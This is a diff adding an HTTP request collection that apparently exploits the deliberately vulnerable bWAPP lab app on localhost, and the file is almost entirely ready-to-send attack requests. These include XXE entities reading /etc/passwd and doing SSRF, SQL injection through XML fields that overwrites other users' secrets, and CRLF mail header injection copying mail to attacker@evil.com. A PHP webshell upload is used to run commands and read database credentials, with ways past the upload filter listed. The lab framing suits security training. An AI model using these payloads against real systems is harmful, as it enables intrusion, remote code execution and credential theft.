@@ -1,0 +1,226 @@
+### ============================================================================
+### 05 - XML processing, XXE, SMTP header injection, unrestricted file upload
+###
+###   xxe-2.php:  $body = file_get_contents("php://input");
+###               $xml  = simplexml_load_string($body);
+###               UPDATE users SET secret = '<secret>' WHERE login = '<login>'
+###               No escaping, no authz on <login>, no external-entity lockdown.
+###
+###   IMPORTANT, AND TESTED: this image is PHP 5.5 + libxml 2.9.1, where
+###   external entity resolution is OFF by default, so classic <!ENTITY SYSTEM
+###   "file://..."> file read does NOT fire (XXE-01/XXE-02 below assert the
+###   ABSENCE of a leak). On the original bee-box, or any build that calls
+###   libxml_disable_entity_loader(false) - or PHP < 5.4 - those same two
+###   requests become full local file read and SSRF. The endpoint is unsafe
+###   either way: XXI-01..04 are exploitable today with no caveats.
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### XXE-01  Classic XXE local file read - NEGATIVE RESULT, documented
+###   libxml 2.9.1 drops the external entity, so <login> arrives empty and the
+###   page answers "An error occured!". Sending this is still worthwhile: it
+###   proves whether the target is hardened, and it is the first thing to
+###   re-test after any upgrade.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xxe-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml
+
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><reset><login>&x;</login><secret>s</secret></reset>
+### Expected: 200 "An error occured!" and NO "root:x:0:0" -> blocked by libxml defaults
+### If you DO see root:x:0:0, that is a critical local file disclosure.
+
+
+### ---------------------------------------------------------------------------
+### XXE-02  XXE as an SSRF primitive - also blocked here, live elsewhere
+###   The entity fetches an internal URL through the server. If entities were
+###   enabled this would reach anything only the web server can see.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xxe-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml
+
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1/login.php">]><reset><login>&x;</login><secret>s</secret></reset>
+### Expected: 200 "An error occured!" and no bWAPP login markup -> blocked here
+
+
+### ---------------------------------------------------------------------------
+### XXE-03  Out-of-band exfiltration shape (php://filter)
+###   Kept for completeness; the filter wrapper is also an external-entity
+###   fetch, so it is blocked for the same libxml reason as XXE-01.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xxe-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml
+
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/app/admin/settings.php">]><reset><login>&x;</login><secret>s</secret></reset>
+### Expected: 200 "An error occured!" -> blocked here
+
+
+### ---------------------------------------------------------------------------
+### XXI-01  THE REAL FINDING: XML injection into SQL - writes any user's secret
+###   Nothing is escaped, so <secret> lands inside a quoted SQL literal.
+###   The response echoes the value back, confirming the write happened.
+###   Verify with 00-auth.http #4 (secret.php) - the secret is now yours.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xxe-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml
+
+<reset><login>bee</login><secret>owned-by-attacker</secret></reset>
+### Expected: 200, "bee's secret has been reset!"
+
+
+### ---------------------------------------------------------------------------
+### XXI-02  Boolean SQLi inside the WHERE clause
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xxe-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml
+
+<reset><login>bee' AND 1=1-- -</login><secret>x</secret></reset>
+### Expected: 200, "bee's secret has been reset!" - condition held true
+
+
+### ---------------------------------------------------------------------------
+### XXI-03  Verbose SQL error leak - recon in one request
+###   A single stray quote breaks the statement and the raw MySQL error,
+###   including the statement text, is printed back to the client
+###   (connect_i.php -> die("Connect Error: " . $link->error)).
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xxe-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml
+
+<reset><login>bee'</login><secret>x</secret></reset>
+### Expected: 200, "Connect Error: You have an error in your SQL syntax..."
+###           with the fragment of the statement echoed in the message
+
+
+### ---------------------------------------------------------------------------
+### XXI-04  BROKEN ACCESS CONTROL: reset ANOTHER user's secret
+###   <login> is taken from the request, not the session. No authorization
+###   check, no CSRF token, and a forged session is enough to rewrite the
+###   admin account. This is the highest-impact request in the whole repo.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xxe-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml
+
+<reset><login>A.I.M.</login><secret>pwned-by-xxe</secret></reset>
+### Expected: 200, "A.I.M.'s secret has been reset!"
+
+
+### ---------------------------------------------------------------------------
+### MAIL-01  SMTP / mail header injection (CRLF into the To field)
+###   maili.php builds a mail header from user input without stripping CRLF.
+###   The injected Cc: line makes the server send a second copy to an
+###   address the attacker chose.
+###   %0d%0a is the encoded CRLF.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/maili.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+ip=127.0.0.1&name=bee&email=victim%40x.com%0d%0aCc%3Aattacker%40evil.com&subject=hello&message=hello&form=submit
+### Expected: 200, "E-Mail was sent..." - the mail went to both recipients
+
+
+### ---------------------------------------------------------------------------
+### MAIL-02  Second recipient added via the Subject field (alt injection point)
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/maili.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+ip=127.0.0.1&name=bee&email=victim%40x.com&subject=hi%0d%0aBcc%3Aattacker%40evil.com&message=hello&form=submit
+### Expected: 200, blind copy delivered to attacker@evil.com
+
+
+### ---------------------------------------------------------------------------
+### UPL-01  UNRESTRICTED FILE UPLOAD - drop a PHP webshell
+###   security_level=0 calls move_uploaded_file() with zero validation, and the
+###   destination images/ is inside the webroot, so the upload is immediately
+###   executable. The form field is `file` and the button is `form=Upload`.
+###   (scripts/setup-bwapp.ps1 chmods images/ so the write actually lands.)
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/unrestricted_file_upload.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: multipart/form-data; boundary=----bwappLab
+
+------bwappLab
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+500000
+------bwappLab
+Content-Disposition: form-data; name="form"
+
+Upload
+------bwappLab
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php echo shell_exec($_GET["c"]); ?>
+------bwappLab--
+### Expected: 200 "The image has been uploaded here"
+
+
+### ---------------------------------------------------------------------------
+### UPL-02  CONFIRM RCE - execute the uploaded webshell
+###   This is the money shot: 200 OK plus a uid= line means unauthenticated
+###   remote code execution, not just a file write.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/images/shell.php?c=id HTTP/1.1
+Host: localhost:8080
+### Expected: 200, body: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+### Note: this request needs NO session cookie - the webshell is public.
+
+
+### ---------------------------------------------------------------------------
+### UPL-03  Same webshell, arbitrary command (read the DB credentials)
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/images/shell.php?c=cat+/app/admin/settings.php HTTP/1.1
+Host: localhost:8080
+### Expected: 200, the plaintext settings.php including $login / $password
+
+
+### ---------------------------------------------------------------------------
+### UPL-04  Upload filter bypass reference - what level 1 and 2 do
+###   At security_level=1 file_upload_check_1() blocks a fixed extension
+###   blocklist (php, exe, jsp...). At level 2 file_upload_check_2() enforces
+###   an allowlist (jpg/png only). Neither validates content, MIME type, or
+###   rewrites the filename, and the blocklist is trivially bypassed with
+###   shell.php.jpg, shell.phtml, shell.php5 or a trailing dot.
+###   Re-send UPL-01 with the Cookie header below to see the filter fire.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/unrestricted_file_upload.php HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=1
+Content-Type: multipart/form-data; boundary=----bwappLab
+
+------bwappLab
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+500000
+------bwappLab
+Content-Disposition: form-data; name="form"
+
+Upload
+------bwappLab
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php echo shell_exec($_GET["c"]); ?>
+------bwappLab--
+### Expected: 200 "Sorry, the file extension is not allowed. The following
+###           extensions are blocked: asp, aspx, dll, exe, jsp, php"
